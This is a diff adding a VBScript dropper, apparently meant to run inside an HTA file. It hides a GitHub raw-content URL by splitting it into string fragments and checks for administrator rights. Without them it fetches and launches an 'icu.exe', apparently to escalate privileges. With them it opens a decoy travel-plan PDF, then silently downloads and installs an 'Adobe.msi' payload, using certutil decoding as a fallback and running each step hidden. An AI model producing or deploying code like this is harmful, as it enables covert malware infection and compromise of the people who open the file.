@@ -1,0 +1,145 @@
+Dim fso, sh, qs, selfPath, isAdmin, http, stream
+Dim p1, p2, p3, p4, p5
+Dim msiUrl, msiPath, pdfUrl, pdfPath, tmpExe, icuUrl
+
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set sh  = CreateObject("WScript.Shell")
+qs  = Chr(34)
+
+p1 = "https://raw.g"
+p2 = "ithubuserco"
+p3 = "ntent.com/rotalbilly5"
+p4 = "-sketch/Dream/"
+p5 = "main/"
+
+selfPath = location.href
+selfPath = Replace(selfPath, "file:///", "")
+selfPath = Replace(selfPath, "%20", " ")
+selfPath = Replace(selfPath, "/", "\")
+
+' --- admin probe ---
+isAdmin = False
+On Error Resume Next
+Dim tmpOut, fIn, contents
+tmpOut = sh.ExpandEnvironmentStrings("%TEMP%") & "\_p.txt"
+sh.Run "%COMSPEC% /c whoami /groups > " & qs & tmpOut & qs, 0, True
+Set fIn = fso.OpenTextFile(tmpOut, 1)
+contents = fIn.ReadAll
+fIn.Close
+If InStr(contents, "S-1-16-12288") > 0 Then isAdmin = True
+fso.DeleteFile tmpOut, True
+Err.Clear
+On Error GoTo 0
+
+' --- not admin: fetch icu.exe, fire it, exit ---
+If Not isAdmin Then
+    tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
+    icuUrl = p1 & p2 & p3 & p4 & p5 & "icu.exe"
+
+    On Error Resume Next
+    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+    http.Open "GET", icuUrl, False
+    http.Send
+    If http.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write http.ResponseBody
+        stream.SaveToFile tmpExe, 2
+        stream.Close
+    End If
+    Err.Clear
+    On Error GoTo 0
+
+    If fso.FileExists(tmpExe) Then
+        sh.Run qs & tmpExe & qs & " m4a1_dev4 mshta.exe " & qs & selfPath & qs, 0, False
+    End If
+    Exit Sub
+End If
+
+' --- admin: cleanup icu, then run payload ---
+tmpExe = sh.ExpandEnvironmentStrings("%TEMP%") & "\icu.exe"
+On Error Resume Next
+If fso.FileExists(tmpExe) Then fso.DeleteFile tmpExe, True
+Err.Clear
+On Error GoTo 0
+
+' --- PDF first ---
+pdfUrl  = p1 & p2 & p3 & p4 & p5 & "Travel-Meeting-Plan-Q4-2026.pdf"
+pdfPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Travel-Meeting-Plan-Q4-2026.pdf"
+
+On Error Resume Next
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+http.Open "GET", pdfUrl, False
+http.Send
+If http.Status = 200 Then
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile pdfPath, 2
+    stream.Close
+End If
+Err.Clear
+On Error GoTo 0
+
+If fso.FileExists(pdfPath) Then
+    sh.Run "msedge.exe """ & pdfPath & """", 1, False
+End If
+
+' --- MSI second ---
+msiUrl  = p1 & p2 & p3 & p4 & p5 & "Adobe.msi"
+msiPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.msi"
+
+On Error Resume Next
+If fso.FileExists(msiPath) Then fso.DeleteFile msiPath, True
+Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
+http.Open "GET", msiUrl, False
+http.Send
+Err.Clear
+On Error GoTo 0
+
+If http.Status = 200 Then
+    Dim saved
+    saved = False
+
+    On Error Resume Next
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = 1
+    stream.Open
+    stream.Write http.ResponseBody
+    stream.SaveToFile msiPath, 2
+    stream.Close
+    Err.Clear
+    On Error GoTo 0
+
+    If fso.FileExists(msiPath) Then
+        saved = True
+    Else
+        Dim b64Path, fh, xmlDoc, binNode, b64Text
+        b64Path = sh.ExpandEnvironmentStrings("%TEMP%") & "\Adobe.b64"
+        On Error Resume Next
+        Set xmlDoc = CreateObject("MSXML2.DOMDocument")
+        Set binNode = xmlDoc.createElement("b")
+        binNode.dataType = "bin.base64"
+        binNode.nodeTypedValue = http.ResponseBody
+        b64Text = binNode.text
+        Err.Clear
+        On Error GoTo 0
+        If b64Text <> "" Then
+            Set fh = fso.CreateTextFile(b64Path, True)
+            fh.Write b64Text
+            fh.Close
+            sh.Run "%COMSPEC% /c certutil.exe -decode """ & b64Path & """ """ & msiPath & """", 0, True
+            If fso.FileExists(msiPath) Then saved = True
+            On Error Resume Next
+            fso.DeleteFile b64Path, True
+            Err.Clear
+            On Error GoTo 0
+        End If
+    End If
+
+    If saved Then
+        sh.Run "msiexec.exe /i """ & msiPath & """ /qn /norestart", 0, False
+    End If
+End If
